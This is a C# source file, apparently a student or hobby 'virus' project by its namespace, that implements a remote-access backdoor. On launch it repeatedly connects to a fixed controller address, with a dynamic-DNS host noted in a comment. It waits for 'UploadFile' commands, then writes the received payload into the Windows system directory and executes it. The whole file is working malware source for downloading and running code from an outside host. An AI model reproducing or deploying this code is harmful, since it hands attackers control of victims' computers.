using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace A__Project_Virus
{
    public partial class Form1 : Form
    {
        private TcpClient client;
        public Form1()
        {
            client = new TcpClient();
            ThreadPool.QueueUserWorkItem(new WaitCallback(RUN), client);
        }
        public void RUN(object state)
        {
            TcpClient cl = state as TcpClient;
            while (true)
            {
                if (!cl.Connected)
                {
                    try
                    {
                        cl.Connect("192.168.2.1", 9875);//fcis.no-ip.org
                        ThreadPool.QueueUserWorkItem(new WaitCallback(DataRecievd), cl.GetStream());//read data from input stream.
                        //break;
                    }
                    catch (SocketException ioex)
                    {
                        Thread.Sleep(10000);
                    }
                }
                else { Thread.Sleep(100000); }
            }
            
            //ThreadPool.QueueUserWorkItem(new WaitCallback(RUN), client);
        }
        public void DataRecievd(object state)
        {
            BinaryReader br =new BinaryReader(state as NetworkStream);
            while (true)
            {
                try
                {
                    string data = br.ReadString();
                    if (data.Substring(0, 10).ToLower() == "UploadFile".ToLower())
                    {
                        string fileName = data.Substring(10, 100);//100 byte for file name.
                        byte[] fileData = new byte[data.Length - 110];
                        Encoding.Default.GetBytes(data, 110, data.Length - 110, fileData, 0);
                        File.WriteAllBytes(Environment.SystemDirectory + "\\" + fileName, fileData);
                        try
                        {
                            Process.Start(new ProcessStartInfo(Environment.SystemDirectory + "\\" + fileName));
                        }
                        catch (Exception ex)
                        {
                            new BinaryWriter(state as NetworkStream).Write(ex.Message);
                        }
                    }
                }
                catch (SocketException so) { return; }
                catch (Exception) { Thread.Sleep(1000); }
            }
        }
    }
}